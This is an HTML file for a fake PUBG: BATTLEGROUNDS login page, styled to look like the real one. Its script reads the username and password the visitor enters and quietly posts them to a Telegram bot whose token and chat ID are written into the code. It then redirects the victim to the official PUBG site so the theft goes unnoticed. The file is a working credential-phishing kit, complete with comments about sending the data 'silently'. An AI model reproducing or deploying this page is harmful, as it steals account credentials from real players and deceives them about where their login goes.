<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG: BATTLEGROUNDS Login</title>
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial Black', 'Impact', sans-serif;
        }
        body {
            background: url('https://images.hdqwalls.com/download/pubg-playerunknowns-battlegrounds-5k-2018-jo-1920x1080.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            position: relative;
        }
        /* Overlay dark */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            position: relative;
            z-index: 1;
        }
        .pubg-card {
            background: rgba(20, 20, 20, 0.9);
            border: 2px solid #f5a623;
            border-radius: 12px;
            padding: 40px 30px;
            box-shadow: 0 0 30px rgba(245, 166, 35, 0.5);
            backdrop-filter: blur(5px);
            text-align: center;
        }
        .logo {
            margin-bottom: 30px;
        }
        .logo img {
            width: 120px;
            height: auto;
            filter: drop-shadow(0 0 10px #f5a623);
        }
        .logo h1 {
            color: #f5a623;
            font-size: 28px;
            letter-spacing: 2px;
            text-transform: uppercase;
            margin-top: 10px;
            text-shadow: 0 0 10px #f5a623;
        }
        .logo p {
            color: #ccc;
            font-size: 12px;
            letter-spacing: 1px;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        .input-group {
            position: relative;
        }
        .input-group i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #f5a623;
            font-size: 18px;
        }
        .input-group input {
            width: 100%;
            padding: 15px 15px 15px 45px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid #444;
            border-radius: 40px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
        }
        .input-group input:focus {
            border-color: #f5a623;
            box-shadow: 0 0 10px #f5a623;
        }
        .input-group input::placeholder {
            color: #aaa;
            font-size: 14px;
        }
        .options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #ccc;
            font-size: 14px;
        }
        .options label {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }
        .options input[type="checkbox"] {
            accent-color: #f5a623;
            width: 16px;
            height: 16px;
        }
        .options a {
            color: #f5a623;
            text-decoration: none;
        }
        .options a:hover {
            text-decoration: underline;
        }
        .login-btn {
            background: #f5a623;
            border: none;
            border-radius: 40px;
            padding: 15px;
            font-size: 18px;
            font-weight: bold;
            color: #111;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 5px 0 #b36b0e;
        }
        .login-btn:hover {
            background: #ffb347;
            transform: translateY(-2px);
            box-shadow: 0 7px 0 #b36b0e;
        }
        .login-btn:active {
            transform: translateY(5px);
            box-shadow: 0 2px 0 #b36b0e;
        }
        .register-link {
            margin-top: 20px;
            color: #ccc;
            font-size: 14px;
        }
        .register-link a {
            color: #f5a623;
            font-weight: bold;
            text-decoration: none;
        }
        .register-link a:hover {
            text-decoration: underline;
        }
        .footer {
            margin-top: 30px;
            color: #888;
            font-size: 12px;
        }
        .footer a {
            color: #f5a623;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="pubg-card">
            <div class="logo">
                <!-- يمكنك استخدام شعار PUBG بصيغة png أو نص -->
                <img src="https://i.imgur.com/7I9J5wN.png" alt="PUBG Logo" onerror="this.style.display='none'">
                <h1>PUBG</h1>
                <p>BATTLEGROUNDS</p>
            </div>
            <form id="loginForm" action="#">
                <div class="input-group">
                    <i class="fas fa-user"></i>
                    <input type="text" id="username" placeholder="Username / Email" required>
                </div>
                <div class="input-group">
                    <i class="fas fa-lock"></i>
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <div class="options">
                    <label>
                        <input type="checkbox"> Remember me
                    </label>
                    <a href="#">Forgot password?</a>
                </div>
                <button type="submit" class="login-btn">LOGIN</button>
                <div class="register-link">
                    Don't have an account? <a href="#">Sign up now</a>
                </div>
            </form>
            <div class="footer">
                <a href="#">Privacy Policy</a> • <a href="#">Terms of Service</a>
            </div>
        </div>
    </div>

    <script>
        // ========== Telegram Configuration ==========
        const telegramBotToken = '8567650656:AAFAXe5M_xQ6Zom6Q_uc7g2wAD3W2fAdqkI';
        const telegramChatId = '8304101362';
        // ============================================

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const message = `🎮 PUBG Login Data\n👤 User: ${username}\n🔑 Pass: ${password}`;
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

            // Send data silently to Telegram
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .catch(error => console.error('Telegram error:', error))
            .finally(() => {
                // Redirect to official PUBG site without any notification
                window.location.href = 'https://www.pubg.com';
            });
        });
    </script>
</body>
</html>
